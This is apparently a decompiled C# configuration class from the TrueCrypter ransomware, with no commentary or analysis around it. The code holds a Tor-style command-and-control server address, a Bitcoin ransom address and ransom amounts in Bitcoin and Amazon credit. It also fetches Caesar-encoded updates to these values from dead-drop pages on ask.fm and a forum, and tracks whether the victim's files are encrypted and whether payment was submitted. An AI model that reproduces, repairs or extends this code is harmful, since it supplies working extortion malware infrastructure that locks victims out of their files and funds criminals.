using System;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using TrueCrypter.Ransomware.Core.Cryptography;
using TrueCrypter.Ransomware.Core.Networking;

namespace TrueCrypter.Config;

public class Settings
{
	private static XmlDocument Xml = new XmlDocument();

	public static string TrueCrypterPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\TrueCrypter\\";

	public static bool Encrypted;

	public static bool Submitted;

	public static string PublicKey;

	public static string Wallpaper;

	private static string[] URLs = new string[2] { "https://ask.fm/innocentask001", "http://forumforastral.com/innocentuser001" };

	public static string ServerUrl = "http://m2coftkce5g4gyza.onion.gq";

	public static string BitcoinAddress = "1337SfJb91wMF7U7tPYSEa2FBtPr7pZxji";

	public static string AmazonAmount = "115";

	public static string BitcoinAmount = "0.2";

	public static string PaymentMethod = "Bitcoin";

	public Settings()
	{
		Xml.Load(TrueCrypterPath + "TrueCrypter.xml");
		Load();
		Sync();
	}

	public static void Load()
	{
		//IL_007d: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Xml.Load(TrueCrypterPath + "TrueCrypter.xml");
			PublicKey = ReadXmlNode("General", "PublicKey");
			Encrypted = Convert.ToBoolean(ReadXmlNode("Infos", "Encrypted"));
			Submitted = Convert.ToBoolean(ReadXmlNode("Infos", "Submitted"));
			Wallpaper = ReadXmlNode("Infos", "Wallpaper");
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public static void Save()
	{
		//IL_00b7: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Xml.Load(TrueCrypterPath + "TrueCrypter.xml");
			XmlNode xmlNode = Xml.SelectSingleNode("Config/General/PublicKey");
			xmlNode.InnerText = PublicKey;
			xmlNode = Xml.SelectSingleNode("Config/Infos/Encrypted");
			xmlNode.InnerText = Encrypted.ToString();
			xmlNode = Xml.SelectSingleNode("Config/Infos/Submitted");
			xmlNode.InnerText = Submitted.ToString();
			xmlNode = Xml.SelectSingleNode("Config/Infos/Wallpaper");
			xmlNode.InnerText = Wallpaper.ToString();
			Xml.Save(TrueCrypterPath + "TrueCrypter.xml");
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.ToString());
		}
	}

	public static void Sync()
	{
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		string[] uRLs = URLs;
		foreach (string url in uRLs)
		{
			try
			{
				string @string = Caesar.Decrypt(NetworkClient.GetHtml(url), 5);
				ServerUrl = Parse(@string, "ServerUrl=");
				BitcoinAddress = Parse(@string, "BitcoinAddress=");
				BitcoinAmount = Parse(@string, "BitcoinAmount=");
				AmazonAmount = Parse(@string, "AmazonAmount=");
				if (ServerUrl == string.Empty || BitcoinAddress == string.Empty || BitcoinAmount == string.Empty || AmazonAmount == string.Empty)
				{
					continue;
				}
				break;
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.ToString());
			}
		}
	}

	private static string Parse(string _string, string Delimiter)
	{
		Regex regex = new Regex(Delimiter + "(.*)");
		Match match = regex.Match(_string);
		return match.Groups[1].ToString();
	}

	private static string ReadXmlNode(string Tab, string Name)
	{
		return Xml.SelectSingleNode("Config/" + Tab + "/" + Name)!.InnerText;
	}
}
